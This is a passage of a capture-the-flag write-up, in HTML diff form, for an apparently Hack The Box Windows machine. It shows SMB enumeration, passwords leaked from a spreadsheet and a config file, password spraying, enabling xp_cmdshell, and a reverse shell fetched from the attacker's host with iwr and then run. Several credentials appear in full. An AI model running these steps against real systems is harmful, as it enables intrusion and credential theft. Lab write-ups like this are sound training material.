+<span class="w">  </span><span class="s2">&quot;(objectClass=</span><span class="si">${</span><span class="nv">type</span><span class="si">}</span><span class="s2">)&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>samaccountname<span class="w"> </span><span class="p">|</span><span class="se">\</span>
+grep<span class="w"> </span>sAMAccountName<span class="w"> </span><span class="p">|</span><span class="se">\</span>
+cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+tee<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">type</span><span class="si">}</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="enumerating-smb">
+<h2>Enumerating SMB<a class="headerlink" href="#enumerating-smb" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.10.11.51<span class="w"> </span>-U<span class="w"> </span>rose<span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;KxEPkKe6R8su&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Can&#39;t load /etc/samba/smb.conf - run testparm to debug it
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	Accounting Department Disk
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	SYSVOL          Disk      Logon server share
+	Users           Disk
+SMB1 disabled -- no workgroup available
+</pre></div>
+</div>
+<p>Get the files in the share</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>//10.10.11.51/Accounting<span class="se">\ </span>Department<span class="w"> </span>-U<span class="w"> </span>rose<span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;KxEPkKe6R8su&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
+  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sun</span> <span class="n">Jun</span>  <span class="mi">9</span> <span class="mi">11</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">21</span> <span class="mi">2024</span>
+  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sun</span> <span class="n">Jun</span>  <span class="mi">9</span> <span class="mi">11</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">21</span> <span class="mi">2024</span>
+  <span class="n">accounting_2024</span><span class="o">.</span><span class="n">xlsx</span>                <span class="n">A</span>    <span class="mi">10217</span>  <span class="n">Sun</span> <span class="n">Jun</span>  <span class="mi">9</span> <span class="mi">11</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">49</span> <span class="mi">2024</span>
+  <span class="n">accounts</span><span class="o">.</span><span class="n">xlsx</span>                       <span class="n">A</span>     <span class="mi">6780</span>  <span class="n">Sun</span> <span class="n">Jun</span>  <span class="mi">9</span> <span class="mi">11</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2024</span>
+
+		<span class="mi">6367231</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">924956</span> <span class="n">blocks</span> <span class="n">available</span>
+<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">mget</span> <span class="o">*</span>
+</pre></div>
+</div>
+</section>
+<section id="password-leak-in-corrupted-xlsx">
+<h2>Password leak in corrupted xlsx<a class="headerlink" href="#password-leak-in-corrupted-xlsx" title="Permalink to this heading">#</a></h2>
+<p>The xlsx is corrupted but can be treated as a zip, once unzipped the file structure is apparently standard, and what we’re interested in is mostly in <code class="docutils literal notranslate"><span class="pre">xl/sharedStrings.xml</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>xq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.sst.si[].t.&quot;#text&quot;&#39;</span><span class="w"> </span>sharedStrings.xml
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">First</span> <span class="n">Name</span>
+<span class="n">Last</span> <span class="n">Name</span>
+<span class="n">Email</span>
+<span class="n">Username</span>
+<span class="n">Password</span>
+<span class="n">Angela</span>
+<span class="n">Martin</span>
+<span class="n">angela</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">angela</span>
+<span class="mi">0</span><span class="n">fwz7Q4mSpurIt99</span>
+<span class="n">Oscar</span>
+<span class="n">Martinez</span>
+<span class="n">oscar</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">oscar</span>
+<span class="mi">86</span><span class="n">LxLBMgEWaKUnBG</span>
+<span class="n">Kevin</span>
+<span class="n">Malone</span>
+<span class="n">kevin</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">kevin</span>
+<span class="n">Md9Wlq1E5bZnVDVo</span>
+<span class="n">NULL</span>
+<span class="n">sa</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">sa</span>
+<span class="n">MSSQxxxxxxx</span>
+</pre></div>
+</div>
+<p>That’s what we get</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">angela</span><span class="p">:</span><span class="mi">0</span><span class="n">fxxxxxxxxxxxxxx</span>
+<span class="n">oscar</span><span class="p">:</span><span class="mi">86</span><span class="n">Lxxxxxxxxxxxxx</span>
+<span class="n">kevin</span><span class="p">:</span><span class="n">Md9xxxxxxxxxxxxx</span>
+<span class="n">sa</span><span class="p">:</span><span class="n">MSSQxxxxxxx</span>
+</pre></div>
+</div>
+</section>
+<section id="mssql-connecting">
+<h2>MSSQL - Connecting<a class="headerlink" href="#mssql-connecting" title="Permalink to this heading">#</a></h2>
+<p>The password itself is pretty telling as per what it’s used for, but we can spray it anyway so see if it’s used anywhere else.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cme<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span>-u<span class="w"> </span>loot/user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;MSSQxxxxxxx&#39;</span><span class="w"> </span>--local-auth<span class="w"> </span>--continue-on-success
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:DC01<span class="o">)</span>
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;Guest&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;krbtgt&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;michael&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;ryan&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;oscar&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;sql_svc&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;rose&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sa:MSSQxxxxxxx<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;angela&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;oscar&#39;</span>.
+MSSQL<span class="w">       </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">1433</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;kevin&#39;</span>.
+</pre></div>
+</div>
+</section>
+<section id="mssql-xp-cmdshell">
+<h2>MSSQL - XP Cmdshell<a class="headerlink" href="#mssql-xp-cmdshell" title="Permalink to this heading">#</a></h2>
+<p>Connecting to the database and use the built in impacket <code class="docutils literal notranslate"><span class="pre">xp_cmdshell</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mssqlclient.py<span class="w"> </span><span class="s1">&#39;escapetwo.htb/sa:MSSQxxxxxxx@10.10.11.51&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Impacket v0.12.0.dev1+20230816.160145.f6e03b99 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)&gt; enable_xp_cmdshell
+[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option &#39;show advanced options&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)&gt; RECONFIGURE
+SQL (sa  dbo@master)&gt; xp_cmdshell whoami
+output
+--------------
+sequel\sql_svc
+
+NULL
+</pre></div>
+</div>
+<p>This shell is pretty limited we probably want to upgrade it to a proper reverse shell</p>
+</section>
+<section id="mssql-powerjoker">
+<h2>MSSQL - PowerJoker<a class="headerlink" href="#mssql-powerjoker" title="Permalink to this heading">#</a></h2>
+<p>Generate an obfuscated reverse shell with powerjoker</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>/opt/PowerJoker/PowerJoker.py<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.16.93<span class="w"> </span>-p<span class="w"> </span><span class="m">4242</span>
+</pre></div>
+</div>
+<p>We can’t just paste the b64 blob in our <code class="docutils literal notranslate"><span class="pre">xp_cmdshell</span></code> because it’s too long</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Incorrect<span class="w"> </span>syntax<span class="w"> </span>near<span class="w"> </span><span class="s1">&#39;e&#39;</span>.
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>The<span class="w"> </span>identifier<span class="w"> </span>that<span class="w"> </span>starts<span class="w"> </span>with<span class="w"> </span><span class="s1">&#39;JABzAHQAcgAgAD0AIAAiAFQAYwBQACIAKwAiAEMAIgArACIAbABpACIAKwAiAGUAIgArACIAbgB0ACIAOwAkAHIAZQB2AGUAcgBzAGUAZAAgAD0AIAAtAGoAbwBpAG4A&#39;</span><span class="w"> </span>is<span class="w"> </span>too<span class="w"> </span>long.<span class="w"> </span>Maximum<span class="w"> </span>length<span class="w"> </span>is<span class="w"> </span><span class="m">128</span>.
+</pre></div>
+</div>
+<p>But we can host it in a local webserver and download it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>xp_cmdshell<span class="w"> </span>powershell<span class="w"> </span>-c<span class="w"> </span>iwr<span class="w"> </span><span class="s2">&quot;http://10.10.16.93:9090/joke.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\j</span>oke.ps1
+xp_cmdshell<span class="w"> </span>powershell<span class="w"> </span>-c<span class="w"> </span>dir<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\j</span>oke.ps1
+xp_cmdshell<span class="w"> </span>powershell<span class="w"> </span>-c<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\j</span>oke.ps1
+</pre></div>
+</div>
+<p>Once we have a proper reverse shell we can explore a little bit, and find this folder under <code class="docutils literal notranslate"><span class="pre">C:</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">10</span>.10.11.51:57410<span class="w"> </span>&gt;&gt;&gt;<span class="w"> </span><span class="o">[</span>PJSession<span class="o">]</span><span class="w"> </span><span class="m">1</span>:<span class="w"> </span>dir
+
+
+<span class="w">    </span>Directory:<span class="w"> </span>C:<span class="se">\S</span>QL2019<span class="se">\E</span>xpressAdv_ENU
+
+
+Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+d-----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">                </span>1033_ENU_LP
+d-----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">                </span>redist
+d-----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">                </span>resources
+d-----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">                </span>x64
+-a----<span class="w">        </span><span class="m">9</span>/24/2019<span class="w">  </span><span class="m">10</span>:03<span class="w"> </span>PM<span class="w">             </span><span class="m">45</span><span class="w"> </span>AUTORUN.INF
+-a----<span class="w">        </span><span class="m">9</span>/24/2019<span class="w">  </span><span class="m">10</span>:03<span class="w"> </span>PM<span class="w">            </span><span class="m">788</span><span class="w"> </span>MEDIAINFO.XML
+-a----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">             </span><span class="m">16</span><span class="w"> </span>PackageId.dat
+-a----<span class="w">        </span><span class="m">9</span>/24/2019<span class="w">  </span><span class="m">10</span>:03<span class="w"> </span>PM<span class="w">         </span><span class="m">142944</span><span class="w"> </span>SETUP.EXE
+-a----<span class="w">        </span><span class="m">9</span>/24/2019<span class="w">  </span><span class="m">10</span>:03<span class="w"> </span>PM<span class="w">            </span><span class="m">486</span><span class="w"> </span>SETUP.EXE.CONFIG
+-a----<span class="w">         </span><span class="m">6</span>/8/2024<span class="w">   </span><span class="m">3</span>:07<span class="w"> </span>PM<span class="w">            </span><span class="m">717</span><span class="w"> </span>sql-Configuration.INI
+-a----<span class="w">        </span><span class="m">9</span>/24/2019<span class="w">  </span><span class="m">10</span>:03<span class="w"> </span>PM<span class="w">         </span><span class="m">249448</span><span class="w"> </span>SQLSETUPBOOTSTRAPPER.DLL
+
+
+JokerShell<span class="w"> </span>C:<span class="se">\S</span>QL2019<span class="se">\E</span>xpressAdv_ENU&gt;
+</pre></div>
+</div>
+</section>
+<section id="password-leak-from-the-db-config">
+<h2>Password leak from the DB config<a class="headerlink" href="#password-leak-from-the-db-config" title="Permalink to this heading">#</a></h2>
+<p>And in the database configuration file we can find the SA password we just used to connect to it but also the password of <code class="docutils literal notranslate"><span class="pre">sql_svc</span></code> which is the user we have this shell as.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">10</span>.10.11.51:57410<span class="w"> </span>&gt;&gt;&gt;<span class="w"> </span><span class="o">[</span>PJSession<span class="o">]</span><span class="w"> </span><span class="m">1</span>:<span class="w"> </span><span class="nb">type</span><span class="w"> </span>sql-Configuration.INI
+<span class="o">[</span>OPTIONS<span class="o">]</span>
+<span class="nv">ACTION</span><span class="o">=</span><span class="s2">&quot;Install&quot;</span>
+<span class="nv">QUIET</span><span class="o">=</span><span class="s2">&quot;True&quot;</span>
+<span class="nv">FEATURES</span><span class="o">=</span>SQL
+<span class="nv">INSTANCENAME</span><span class="o">=</span><span class="s2">&quot;SQLEXPRESS&quot;</span>
+<span class="nv">INSTANCEID</span><span class="o">=</span><span class="s2">&quot;SQLEXPRESS&quot;</span>
+<span class="nv">RSSVCACCOUNT</span><span class="o">=</span><span class="s2">&quot;NT Service\ReportServer</span><span class="nv">$SQLEXPRESS</span><span class="s2">&quot;</span>
+<span class="nv">AGTSVCACCOUNT</span><span class="o">=</span><span class="s2">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span>
+<span class="nv">AGTSVCSTARTUPTYPE</span><span class="o">=</span><span class="s2">&quot;Manual&quot;</span>
+<span class="nv">COMMFABRICPORT</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>
+<span class="nv">COMMFABRICNETWORKLEVEL</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="m">0</span><span class="s2">&quot;</span>
+<span class="s2">COMMFABRICENCRYPTION=&quot;</span><span class="m">0</span><span class="s2">&quot;</span>
+<span class="s2">MATRIXCMBRICKCOMMPORT=&quot;</span><span class="m">0</span><span class="s2">&quot;</span>
+<span class="s2">SQLSVCSTARTUPTYPE=&quot;</span>Automatic<span class="s2">&quot;</span>
+<span class="s2">FILESTREAMLEVEL=&quot;</span><span class="m">0</span><span class="s2">&quot;</span>
+<span class="s2">ENABLERANU=&quot;</span>False<span class="s2">&quot;</span>
+<span class="s2">SQLCOLLATION=&quot;</span>SQL_Latin1_General_CP1_CI_AS<span class="s2">&quot;</span>
+<span class="s2">SQLSVCACCOUNT=&quot;</span>SEQUEL<span class="se">\s</span>ql_svc<span class="s2">&quot;</span>
+<span class="s2">SQLSVCPASSWORD=&quot;</span>WqSZAxxxxxxxxxxx<span class="s2">&quot;</span>
+<span class="s2">SQLSYSADMINACCOUNTS=&quot;</span>SEQUEL<span class="se">\A</span>dministrator<span class="s2">&quot;</span>
+<span class="s2">SECURITYMODE=&quot;</span>SQL<span class="s2">&quot;</span>
+<span class="s2">SAPWD=&quot;</span>MSSQxxxxxxx<span class="s2">&quot;</span>
+<span class="s2">ADDCURRENTUSERASSQLADMIN=&quot;</span>False<span class="s2">&quot;</span>
+<span class="s2">TCPENABLED=&quot;</span><span class="m">1</span><span class="s2">&quot;</span>
+<span class="s2">NPENABLED=&quot;</span><span class="m">1</span><span class="s2">&quot;</span>
+<span class="s2">BROWSERSVCSTARTUPTYPE=&quot;</span>Automatic<span class="s2">&quot;</span>
+<span class="s2">IAcceptSQLServerLicenseTerms=True</span>
+<span class="s2">JokerShell C:\SQL2019\ExpressAdv_ENU&gt;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">10</span>.10.11.51:57410<span class="w"> </span>&gt;&gt;&gt;<span class="w"> </span><span class="o">[</span>PJSession<span class="o">]</span><span class="w"> </span><span class="m">1</span>:<span class="w"> </span>whoami
+sequel<span class="se">\s</span>ql_svc
+</pre></div>
+</div>
+</section>
+<section id="spraying-the-new-password">
+<h2>Spraying the new password<a class="headerlink" href="#spraying-the-new-password" title="Permalink to this heading">#</a></h2>
+<p>The password for <code class="docutils literal notranslate"><span class="pre">sql_svc</span></code> is reused by <code class="docutils literal notranslate"><span class="pre">ryan</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cme<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span>-u<span class="w"> </span>loot/user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;WqSZAxxxxxxxxxxx&#39;</span><span class="w"> </span>--continue-on-success
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SMB</span>         <span class="mf">10.10.11.51</span>     <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">sequel</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Administrator</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Guest</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">krbtgt</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">michael</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ryan</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">oscar</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">sql_svc</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">rose</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+<span class="n">LDAP</span>        <span class="mf">10.10.11.51</span>     <span class="mi">389</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">sequel</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ca_svc</span><span class="p">:</span><span class="n">WqSZAxxxxxxxxxxx</span>
+</pre></div>
+</div>
+</section>
+<section id="playing-with-activedirectory">
+<h2>Playing with ActiveDirectory<a class="headerlink" href="#playing-with-activedirectory" title="Permalink to this heading">#</a></h2>
+<p>I’m going on a bit of a tangent here, trying to get familiar with windows things in various different ways</p>
+<section id="powershell-activedirectory-module-on-windows">
+<h3>Powershell ActiveDirectory Module (on Windows)<a class="headerlink" href="#powershell-activedirectory-module-on-windows" title="Permalink to this heading">#</a></h3>
+<ul class="simple">
